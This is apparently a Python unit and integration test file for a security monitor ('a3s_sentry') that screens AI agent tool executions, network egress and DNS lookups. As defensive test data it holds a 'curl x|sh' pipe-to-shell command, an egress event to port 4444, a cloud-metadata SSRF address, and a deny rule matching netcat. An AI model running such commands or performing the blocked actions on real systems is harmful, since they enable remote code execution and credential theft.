"""Unit tests (pure) + integration tests against the real sentry binary (skipped if absent)."""

import asyncio
import os
import tempfile
import unittest

from a3s_sentry import (
    Action,
    Audit,
    Event,
    MetricsClient,
    Policy,
    Rule,
    Sentry,
    SentryConfig,
    Severity,
    Verdict,
    parse_metrics,
)
from a3s_sentry.metrics import MetricsSnapshot

_HERE = os.path.dirname(os.path.abspath(__file__))
_REPO = os.path.abspath(os.path.join(_HERE, "..", "..", ".."))
_BIN = os.environ.get("A3S_SENTRY_BIN") or os.path.join(_REPO, "target", "debug", "sentry")
_HAVE_BIN = os.path.exists(_BIN)


class TestPolicy(unittest.TestCase):
    def test_acl_serialization_and_escaping(self):
        rule = Rule(
            name="no-netcat",
            on="ToolExec",
            match=r"(?i)\b(ncat|netcat)\b",
            verdict=Verdict.BLOCK,
            severity=Severity.MEDIUM,
            reason="netcat",
            action=Action.DENY_EXEC,
        )
        acl = Policy([rule]).to_acl()
        self.assertIn("rules = [", acl)
        self.assertIn('name = "no-netcat"', acl)
        self.assertIn('on = "ToolExec"', acl)
        self.assertIn('verdict = "block"', acl)
        self.assertIn('action = "deny-exec"', acl)
        # backslashes in the regex must be doubled for an ACL string literal
        self.assertIn(r'match = "(?i)\\b(ncat|netcat)\\b"', acl)

    def test_empty_policy(self):
        self.assertEqual(Policy().to_acl(), "rules = []\n")

    def test_action_omitted_when_none(self):
        acl = Rule("r", "*", "x", Verdict.ESCALATE, Severity.LOW, "y").to_acl()
        self.assertNotIn("action", acl)


class TestEvents(unittest.TestCase):
    def test_tool_exec_line(self):
        line = Event.tool_exec(1903, ["bash", "-c", "curl x|sh"]).to_line()
        self.assertEqual(line, '{"event":{"ToolExec":{"pid":1903,"argv":["bash","-c","curl x|sh"]}}}')

    def test_egress_line(self):
        self.assertEqual(
            Event.egress(1, "1.2.3.4", 4444).to_line(),
            '{"event":{"Egress":{"pid":1,"peer":"1.2.3.4","port":4444}}}',
        )

    def test_ssl_content_is_read_snake_case(self):
        self.assertIn('"is_read":true', Event.ssl_content(1, "secret", is_read=True).to_line())

    def test_identity_included_only_when_present(self):
        from a3s_sentry import Identity

        ev = Event.dns(1, "x.test", identity=Identity(agent="bot"))
        self.assertIn('"identity":{"agent":"bot"}', ev.to_line())
        self.assertNotIn("identity", Event.dns(1, "x.test").to_line())


class TestDecisionParsing(unittest.TestCase):
    def test_parse_block_audit_with_action(self):
        a = Audit.from_json(
            {
                "agent": "py",
                "event": "ToolExec",
                "subject": "curl x|sh",
                "decision": {
                    "verdict": "block",
                    "tier": "Rules",
                    "severity": "high",
                    "reason": "pipe-to-shell",
                    "action": {"DenyExec": "curl"},
                },
                "enforced": "/tmp/exec-deny.txt",
            }
        )
        self.assertEqual(a.decision.verdict, Verdict.BLOCK)
        self.assertEqual(a.decision.tier, "Rules")
        self.assertEqual(a.decision.severity, Severity.HIGH)
        self.assertIsNotNone(a.decision.action)
        self.assertEqual(a.decision.action.kind, "DenyExec")
        self.assertEqual(a.decision.action.target, "curl")
        self.assertEqual(a.enforced, "/tmp/exec-deny.txt")

    def test_parse_allow_without_action(self):
        a = Audit.from_json(
            {"event": "Dns", "subject": "x", "decision": {"verdict": "allow", "tier": "Llm", "severity": "info", "reason": "ok"}}
        )
        self.assertEqual(a.decision.verdict, Verdict.ALLOW)
        self.assertIsNone(a.decision.action)
        self.assertIsNone(a.agent)


class TestMetricsParsing(unittest.TestCase):
    def test_parse(self):
        text = (
            "# HELP sentry_events_total x\n"
            "# TYPE sentry_events_total counter\n"
            "sentry_events_total 42\n"
            "sentry_blocked_total 5\n"
            "sentry_overload_degraded_total 3\n"
            "sentry_enforce_failed_total 1\n"
        )
        snap = parse_metrics(text)
        self.assertEqual(snap, MetricsSnapshot(events=42, blocked=5, overload_degraded=3, enforce_failed=1))


async def _first_decision(s: Sentry) -> Audit:
    async for audit in s.decisions():
        return audit
    raise AssertionError("stream ended with no decision")


@unittest.skipUnless(_HAVE_BIN, f"sentry binary not found at {_BIN} (build with: cargo build)")
class TestIntegration(unittest.IsolatedAsyncioTestCase):
    async def test_ssrf_egress_blocks_via_real_binary(self):
        """Submit a cloud-metadata SSRF and confirm the SDK round-trips a real block decision."""
        with tempfile.TemporaryDirectory() as d:
            cfg = SentryConfig(bin=_BIN, egress_deny=os.path.join(d, "egress.txt"))
            async with Sentry(cfg) as s:
                await s.submit(Event.egress(1, "169.254.169.254", 80))
                audit = await asyncio.wait_for(_first_decision(s), timeout=15)
            self.assertEqual(audit.decision.verdict, Verdict.BLOCK)
            self.assertEqual(audit.event, "Egress")
            self.assertIsNotNone(audit.decision.action)
            self.assertEqual(audit.decision.action.kind, "DenyEgress")
            self.assertEqual(audit.decision.action.target, "169.254.169.254")

    async def test_custom_acl_rule_round_trips_through_the_daemon(self):
        """Author a rule via the SDK, hand it to the real daemon, and confirm it fires."""
        with tempfile.TemporaryDirectory() as d:
            policy_path = os.path.join(d, "rules.acl")
            Policy(
                [
                    Rule(
                        name="block-evil-dns",
                        on="Dns",
                        match=r"evil\.test",
                        verdict=Verdict.BLOCK,
                        severity=Severity.HIGH,
                        reason="custom rule fired",
                    )
                ]
            ).write(policy_path)
            cfg = SentryConfig(bin=_BIN, policy=policy_path)
            async with Sentry(cfg) as s:
                await s.submit(Event.dns(1, "evil.test"))
                audit = await asyncio.wait_for(_first_decision(s), timeout=15)
            self.assertEqual(audit.decision.verdict, Verdict.BLOCK)
            self.assertEqual(audit.decision.tier, "Rules")
            self.assertEqual(audit.subject, "evil.test")

    async def test_metrics_endpoint(self):
        """With a metrics addr, the SDK reads live counters off /metrics + /healthz."""
        import socket

        sock = socket.socket()
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
        sock.close()
        addr = f"127.0.0.1:{port}"
        with tempfile.TemporaryDirectory() as d:
            cfg = SentryConfig(bin=_BIN, egress_deny=os.path.join(d, "egress.txt"), metrics_addr=addr)
            async with Sentry(cfg) as s:
                await s.submit(Event.egress(1, "169.254.169.254", 80))
                await asyncio.wait_for(_first_decision(s), timeout=15)
                client = MetricsClient(addr)
                self.assertTrue(client.health())
                snap = client.metrics()
                self.assertGreaterEqual(snap.blocked, 1)
                self.assertGreaterEqual(snap.events, 1)


if __name__ == "__main__":
    unittest.main()
